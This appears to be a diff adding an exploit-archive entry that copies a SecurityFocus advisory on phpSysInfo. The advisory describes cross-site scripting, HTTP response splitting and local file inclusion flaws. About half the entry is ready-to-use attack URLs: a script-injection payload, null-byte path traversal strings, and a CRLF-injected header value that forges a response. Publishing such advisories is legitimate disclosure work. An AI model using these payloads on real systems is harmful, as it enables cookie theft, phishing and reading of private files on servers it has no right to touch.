@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/15396/info
+
+phpSysInfo is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+phpSysInfo is prone to cross-site scripting, HTTP response splitting and arbitrary local file inclusion vulnerabilities.
+
+An attacker can exploit these vulnerabilities to steal cookie-based authentication credentials, aid in phishing style attacks and retrieve privileged or sensitive information; other attacks are also possible.
+
+http://www.example.com/index.php?VERSION=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E
+
+http://www.example.com/index.php?_SERVER[HTTP_ACCEPT_LANGUAGE]=../../README%00
+http://www.example.com/index.php?_SERVER[HTTP_ACCEPT_LANGUAGE]=../../README%00&lng=../../README%00
+http://www.example.com//index.php?sensor_program=lmsensors.inc.php/../../README%00
+
+http://www.example.com/index.php?charset=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hacked!</html> 
